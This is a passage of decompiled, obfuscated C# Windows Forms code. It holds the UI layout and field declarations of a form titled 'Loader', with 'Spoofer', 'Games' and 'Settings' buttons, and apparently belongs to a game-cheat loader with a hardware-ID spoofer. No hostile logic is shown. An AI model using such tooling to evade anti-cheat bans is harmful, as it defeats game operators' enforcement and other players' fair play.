			this.aa.Name = "siticoneGradientButton3";
			this.aa.ShadowDecoration.Parent = this.aa;
			this.aa.Size = new Size(169, 51);
			this.aa.TabIndex = 72;
			this.aa.Text = "Games";
			this.aa.Click += this.ac;
			this.ab.CheckedState.Parent = this.ab;
			this.ab.CustomImages.Parent = this.ab;
			this.i.SetDecoration(this.ab, 0);
			this.ab.FillColor = Color.Transparent;
			this.ab.FillColor2 = Color.Transparent;
			this.ab.Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
			this.ab.ForeColor = Color.White;
			this.ab.HoveredState.Parent = this.ab;
			this.ab.Image = Resources.pngaaa_com_3790696;
			this.ab.Location = new Point(12, 93);
			this.ab.Name = "siticoneGradientButton2";
			this.ab.ShadowDecoration.Parent = this.ab;
			this.ab.Size = new Size(175, 52);
			this.ab.TabIndex = 71;
			this.ab.Text = "Spoofer";
			this.ab.Click += this.aa;
			this.ac.CheckedState.Parent = this.ac;
			this.ac.CustomImages.Parent = this.ac;
			this.i.SetDecoration(this.ac, 0);
			this.ac.FillColor = Color.Transparent;
			this.ac.FillColor2 = Color.Transparent;
			this.ac.Font = new Font("Segoe UI Black", 10f, FontStyle.Bold);
			this.ac.ForeColor = Color.White;
			this.ac.HoveredState.Parent = this.ac;
			this.ac.Image = Resources.kindpng_3933927;
			this.ac.Location = new Point(11, 271);
			this.ac.Name = "siticoneGradientButton4";
			this.ac.ShadowDecoration.Parent = this.ac;
			this.ac.Size = new Size(175, 52);
			this.ac.TabIndex = 70;
			this.ac.Text = "Settings";
			this.ac.Click += this.ad;
			this.bv.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bv, 0);
			this.bv.Font = new Font("Segoe UI", 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bv.ForeColor = SystemColors.ButtonHighlight;
			this.bv.Location = new Point(663, 319);
			this.bv.Margin = new Padding(2);
			this.bv.Name = "usersng";
			this.bv.Size = new Size(44, 15);
			this.bv.TabIndex = 77;
			this.bv.Text = "usersng";
			this.o.Enabled = true;
			this.o.Interval = 1;
			this.o.Tick += this.d;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.AutoValidate = AutoValidate.Disable;
			this.BackColor = Color.FromArgb(26, 32, 54);
			base.ClientSize = new Size(662, 352);
			base.Controls.Add(this.bv);
			base.Controls.Add(this.bn);
			base.Controls.Add(this.az);
			base.Controls.Add(this.ay);
			base.Controls.Add(this.av);
			base.Controls.Add(this.aa);
			base.Controls.Add(this.ab);
			base.Controls.Add(this.ac);
			base.Controls.Add(this.r);
			base.Controls.Add(this.k);
			base.Controls.Add(this.j);
			base.Controls.Add(this.h);
			base.Controls.Add(this.g);
			base.Controls.Add(this.ak);
			base.Controls.Add(this.ba);
			base.Controls.Add(this.u);
			base.Controls.Add(this.ar);
			this.i.SetDecoration(this, 1);
			base.FormBorderStyle = FormBorderStyle.None;
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "Main";
			base.Opacity = 0.85;
			base.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Loader";
			base.TransparencyKey = Color.Maroon;
			base.Load += this.b;
			this.r.ResumeLayout(false);
			this.r.PerformLayout();
			((ISupportInitialize)this.s).EndInit();
			this.u.ResumeLayout(false);
			this.u.PerformLayout();
			((ISupportInitialize)this.w).EndInit();
			this.ak.ResumeLayout(false);
			this.ak.PerformLayout();
			((ISupportInitialize)this.am).EndInit();
			this.ar.ResumeLayout(false);
			this.ar.PerformLayout();
			((ISupportInitialize)this.at).EndInit();
			this.ba.ResumeLayout(false);
			this.ba.PerformLayout();
			((ISupportInitialize)this.bc).EndInit();
			((ISupportInitialize)this.q).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x0600009D RID: 157 RVA: 0x0000EFF4 File Offset: 0x0000D1F4
		// Note: this type is marked as 'beforefieldinit'.
		static Main()
		{
			DateTime d = new DateTime(2022, 6, 21);
			if ((d - DateTime.Now).TotalDays < 0.0)
			{
			}
			Main.folder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			Main.specificFolder = Path.Combine(Main.folder, "DigitalEntitlements");
			Main.random = new Random();
		}

		// Token: 0x04000012 RID: 18
		private DiscordRpc.EventHandlers a;

		// Token: 0x04000013 RID: 19
		private DiscordRpc.RichPresence b;

		// Token: 0x04000014 RID: 20
		public static string folder;

		// Token: 0x04000015 RID: 21
		public static string specificFolder;

		// Token: 0x04000016 RID: 22
		public static Random random;

		// Token: 0x04000017 RID: 23
		private string c = Main.RandomString(5);

		// Token: 0x04000018 RID: 24
		private List<Process> d = new List<Process>();

		// Token: 0x0400001A RID: 26
		private SiticoneDragControl f;

		// Token: 0x0400001B RID: 27
		private SiticoneControlBox g;

		// Token: 0x0400001C RID: 28
		private SiticoneControlBox h;

		// Token: 0x0400001D RID: 29
		private SiticoneTransition i;

		// Token: 0x0400001E RID: 30
		private Label j;

		// Token: 0x0400001F RID: 31
		private Label k;

		// Token: 0x04000020 RID: 32
		private SiticoneShadowForm l;

		// Token: 0x04000021 RID: 33
		private SiticoneLabel m;

		// Token: 0x04000022 RID: 34
		private SiticoneLabel n;

		// Token: 0x04000023 RID: 35
		private System.Windows.Forms.Timer o;

		// Token: 0x04000024 RID: 36
		private SiticoneLabel p;

		// Token: 0x04000025 RID: 37
		private BindingSource q;

		// Token: 0x04000026 RID: 38
		private Panel r;

		// Token: 0x04000027 RID: 39
		private PictureBox s;

		// Token: 0x04000028 RID: 40
		private SiticoneLabel t;

		// Token: 0x04000029 RID: 41
		private SiticoneShadowPanel u;

		// Token: 0x0400002A RID: 42
		private SiticoneLabel v;

		// Token: 0x0400002B RID: 43
		private PictureBox w;

		// Token: 0x0400002C RID: 44
		private Label x;

		// Token: 0x0400002D RID: 45
		private SiticoneLabel y;

		// Token: 0x0400002E RID: 46
		private SiticoneOSToggleSwith z;

		// Token: 0x0400002F RID: 47
		private SiticoneGradientButton aa;

		// Token: 0x04000030 RID: 48
		private SiticoneGradientButton ab;

		// Token: 0x04000031 RID: 49
		private SiticoneGradientButton ac;

		// Token: 0x04000032 RID: 50
		private SiticoneRoundedButton ad;

		// Token: 0x04000033 RID: 51
		private SiticoneRoundedButton ae;

		// Token: 0x04000034 RID: 52
		private SiticoneRoundedButton af;

		// Token: 0x04000035 RID: 53
		private SiticoneRoundedButton ag;

		// Token: 0x04000036 RID: 54
		private SiticoneRoundedButton ah;

		// Token: 0x04000037 RID: 55
		private SiticoneRoundedButton ai;

		// Token: 0x04000038 RID: 56
		private SiticoneRoundedButton aj;

		// Token: 0x04000039 RID: 57
		private SiticoneShadowPanel ak;

		// Token: 0x0400003A RID: 58
		private SiticoneLabel al;

		// Token: 0x0400003B RID: 59
		private PictureBox am;

		// Token: 0x0400003C RID: 60
		private Label an;

		// Token: 0x0400003D RID: 61
		private SiticoneRoundedButton ao;

		// Token: 0x0400003E RID: 62
		private SiticoneLabel ap;

		// Token: 0x0400003F RID: 63
		private SiticoneComboBox aq;

		// Token: 0x04000040 RID: 64
		private SiticoneShadowPanel ar;

		// Token: 0x04000041 RID: 65
		private SiticoneLabel @as;

		// Token: 0x04000042 RID: 66
		private PictureBox at;

		// Token: 0x04000043 RID: 67
		private Label au;

		// Token: 0x04000044 RID: 68
		private Label av;

		// Token: 0x04000045 RID: 69
		private PageSetupDialog aw;

		// Token: 0x04000046 RID: 70
		private System.Windows.Forms.Timer ax;

		// Token: 0x04000047 RID: 71
		private Label ay;

		// Token: 0x04000048 RID: 72
		private SiticoneLabel az;

		// Token: 0x04000049 RID: 73
		private SiticoneShadowPanel ba;

		// Token: 0x0400004A RID: 74
		private SiticoneLabel bb;

		// Token: 0x0400004B RID: 75
		private PictureBox bc;

		// Token: 0x0400004C RID: 76
		private Label bd;

		// Token: 0x0400004D RID: 77
		private SiticoneRoundedButton be;

		// Token: 0x0400004E RID: 78
		private SiticoneRoundedButton bf;

		// Token: 0x0400004F RID: 79
		private SiticoneButton bg;

		// Token: 0x04000050 RID: 80
		private SiticoneRoundedButton bh;

		// Token: 0x04000051 RID: 81
		private SiticoneRoundedButton bi;

		// Token: 0x04000052 RID: 82
		private SiticoneRoundedButton bj;

		// Token: 0x04000053 RID: 83
		private SiticoneRoundedButton bk;

		// Token: 0x04000054 RID: 84
		private SiticoneLabel bl;

		// Token: 0x04000055 RID: 85
		private SiticoneTextBox bm;

		// Token: 0x04000056 RID: 86
		private SiticoneGradientButton bn;

		// Token: 0x04000057 RID: 87
		private SiticoneLabel bo;

		// Token: 0x04000058 RID: 88
		private SiticoneRoundedButton bp;

		// Token: 0x04000059 RID: 89
		private SiticoneRoundedButton bq;

		// Token: 0x0400005A RID: 90
		private SiticoneRoundedButton br;

		// Token: 0x0400005B RID: 91
		private SiticoneButton bs;

		// Token: 0x0400005C RID: 92
		private SiticoneLabel bt;

		// Token: 0x0400005D RID: 93
		private SiticoneLabel bu;

		// Token: 0x0400005E RID: 94
		private SiticoneLabel bv;

		// Token: 0x0400005F RID: 95
		private SiticoneLabel bw;

		// Token: 0x04000060 RID: 96
		private SiticoneTextBox bx;

		// Token: 0x04000061 RID: 97
		private System.Windows.Forms.Timer by;

		// Token: 0x04000062 RID: 98
		private SiticoneButton bz;

		// Token: 0x04000063 RID: 99
		private SiticoneLabel ca;

		// Token: 0x04000064 RID: 100
		private SiticoneLabel cb;
	}
}
